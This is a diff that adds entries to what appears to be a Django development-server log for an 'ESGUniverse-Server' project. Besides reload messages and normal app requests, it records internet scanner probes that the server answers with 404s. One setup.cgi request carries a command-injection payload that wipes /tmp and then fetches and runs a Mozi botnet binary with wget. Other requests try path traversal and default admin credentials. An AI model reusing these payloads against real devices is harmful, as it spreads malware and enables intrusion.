@@ -5521,3 +5521,449 @@ Django version 4.0.6, using settings 'mysite.settings'
 Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
 Quit the server with CONTROL-C.
 Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 02:41:03
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Not Found: /
+HTTP GET / 404 [0.04, 92.118.39.88:43508]
+Not Found: http://ip.bablosoft.com/
+HTTP GET http://ip.bablosoft.com/?Z78987407662Q1 404 [0.02, 90.151.171.106:64990]
+Not Found: /
+HTTP GET / 404 [0.02, 46.174.191.32:38364]
+Not Found: /
+HTTP GET / 404 [0.02, 185.180.143.18:59034]
+Not Found: /
+HTTP GET / 404 [0.01, 185.180.143.18:38882]
+Not Found: /../../mnt/mtd/Config/Account1
+HTTP GET /../../mnt/mtd/Config/Account1 404 [0.02, 95.161.131.235:44992]
+Not Found: /
+HTTP GET / 404 [0.02, 202.62.58.65:42390]
+Not Found: google.com:443
+HTTP CONNECT google.com:443 404 [0.02, 45.95.55.242:40722]
+Not Found: /boaform/admin/formLogin
+HTTP GET /boaform/admin/formLogin?username=admin&psd=admin 404 [0.03, 101.0.32.57:58777]
+Not Found: /
+HTTP GET /?XDEBUG_SESSION_START=phpstorm 404 [0.02, 185.7.214.117:36052]
+Not Found: /
+HTTP GET / 404 [0.02, 201.216.200.76:50025]
+Not Found: /
+HTTP GET / 404 [0.02, 78.108.177.51:37974]
+Not Found: /setup.cgi
+HTTP GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 404 [0.02, 27.43.180.87:9347]
+Not Found: /
+HTTP GET / 404 [0.02, 92.118.39.88:56642]
+Not Found: /
+HTTP GET / 404 [0.02, 45.95.55.5:58108]
+Not Found: /actuator/gateway/routes
+HTTP GET /actuator/gateway/routes 404 [0.02, 185.7.214.117:59606]
+Not Found: /
+HTTP GET / 404 [0.02, 159.203.34.249:37540]
+Not Found: /
+HTTP GET / 404 [0.02, 192.241.205.211:39708]
+Not Found: /
+HTTP GET / 404 [0.02, 192.241.222.139:43078]
+Not Found: /
+HTTP GET / 404 [0.02, 83.13.97.38:50169]
+Not Found: /
+HTTP GET / 404 [0.02, 193.118.53.210:60098]
+Not Found: /
+HTTP GET / 404 [0.02, 162.247.74.206:40210]
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 02:42:36
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Not Found: /
+HTTP GET / 404 [0.05, 37.147.236.157:44547]
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:06:33
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:07:04
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:09:05
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Not Found: /
+HTTP GET / 404 [0.04, 141.105.66.212:54422]
+Not Found: /
+HTTP OPTIONS / 404 [0.01, 141.105.66.212:61477]
+Not Found: /
+HTTP OPTIONS / 404 [0.01, 141.105.66.212:8421]
+Not Found: /nice ports,/Trinity.txt.bak
+HTTP GET /nice%20ports%2C/Tri%6Eity.txt%2ebak 404 [0.01, 141.105.66.212:24783]
+Not Found: sip:nm
+HTTP OPTIONS sip:nm 404 [0.01, 141.105.66.212:42914]
+Not Found: /sdk
+Not Found: /server-status
+Not Found: /nmaplowercheck1661504990
+Not Found: /
+Not Found: /
+Not Found: /index.jsa
+Not Found: /.git/HEAD
+HTTP POST /sdk 404 [0.24, 141.105.66.212:25741]
+HTTP GET /server-status 404 [0.24, 141.105.66.212:20122]
+HTTP GET /nmaplowercheck1661504990 404 [0.24, 141.105.66.212:11508]
+Not Found: /scripts/WPnBr.dll
+Not Found: /Portal0000.htm
+HTTP GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 404 [0.20, 141.105.66.212:45933]
+HTTP GET / 404 [0.14, 141.105.66.212:54900]
+HTTP GET /index.jsa 404 [0.16, 141.105.66.212:16415]
+HTTP GET /.git/HEAD 404 [0.16, 141.105.66.212:6278]
+HTTP POST /scripts/WPnBr.dll 404 [0.20, 141.105.66.212:44807]
+HTTP GET /Portal0000.htm 404 [0.25, 141.105.66.212:1440]
+Not Found: /K9dt
+Not Found: /
+Not Found: http://www.google.com
+HTTP GET /K9dt 404 [0.20, 141.105.66.212:6958]
+HTTP GET / 404 [0.16, 141.105.66.212:39454]
+HTTP GET http://www.google.com 404 [0.15, 141.105.66.212:55050]
+Not Found: /Portal/Portal.mwsl
+Not Found: /CSS/Miniweb.css
+HTTP GET /Portal/Portal.mwsl 404 [0.22, 141.105.66.212:64502]
+HTTP GET /CSS/Miniweb.css 404 [0.19, 141.105.66.212:35914]
+Not Found: /base.shtml
+Not Found: /
+HTTP GET /base.shtml 404 [0.05, 141.105.66.212:13605]
+HTTP GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 404 [0.06, 141.105.66.212:18019]
+Not Found: http://www.google.com
+Not Found: /HNAP1
+HTTP HEAD http://www.google.com 404 [0.07, 141.105.66.212:9469]
+HTTP GET /HNAP1 404 [0.06, 141.105.66.212:55373]
+Not Found: /__Additional
+HTTP GET /__Additional 404 [0.06, 141.105.66.212:31159]
+Not Found: /docs/cplugError.html/
+HTTP GET /docs/cplugError.html/ 404 [0.01, 141.105.66.212:37111]
+Not Found: /
+HTTP GET / 404 [0.03, 141.105.66.212:16284]
+Not Found: www.google.com:80
+HTTP CONNECT www.google.com:80 404 [0.02, 141.105.66.212:31867]
+Not Found: /start.asp
+HTTP GET /start.asp 404 [0.02, 141.105.66.212:46022]
+Not Found: /favicon.ico
+HTTP GET /favicon.ico 404 [0.04, 141.105.66.212:15428]
+Not Found: /main.php
+HTTP GET /main.php 404 [0.03, 141.105.66.212:21822]
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:09:20
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Not Found: /
+HTTP GET / 404 [0.02, 141.105.66.212:18014]
+Not Found: /
+HTTP GET / 404 [0.01, 141.105.66.212:26772]
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:09:59
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:11:12
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:11:33
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:14:10
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:14:28
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:15:47
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:16:06
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:16:38
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:18:37
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:19:10
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:20:07
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Not Found: /
+HTTP GET / 404 [0.02, 46.174.191.29:38364]
+HTTP POST /accounts/withdraw_membership 200 [0.03, 211.213.60.88:50591]
+HTTP POST /accounts/withdraw_membership 200 [0.02, 211.213.60.88:50591]
+HTTP POST /notification/load_noti_list 200 [0.02, 211.213.60.88:50604]
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:20:25
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:33:54
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:34:14
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:34:40
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/notification/models.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:34:59
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Not Found: /manager/html
+HTTP GET /manager/html 404 [0.05, 51.83.75.133:49952]
+HTTP POST /accounts/withdraw_membership 200 [0.05, 211.213.60.88:50705]
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:39:42
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:44:45
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:45:00
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Not Found: www.google.com:443
+HTTP CONNECT www.google.com:443 404 [0.02, 45.138.74.183:52319]
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:47:15
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:48:36
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:48:55
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/accounts/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:49:04
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/notification/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:51:13
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/friends/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:54:27
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/friends/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 18:56:11
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/friends/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 19:00:05
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/friends/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 19:00:31
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/friends/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 19:02:09
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/ESGUniverse-Server/friends/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+August 26, 2022 - 19:12:11
+Django version 4.0.6, using settings 'mysite.settings'
+Starting ASGI/Channels version 3.0.5 development server at http://158.247.235.218:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Not Found: /hudson
+HTTP GET /hudson 404 [0.03, 192.241.221.228:40082]
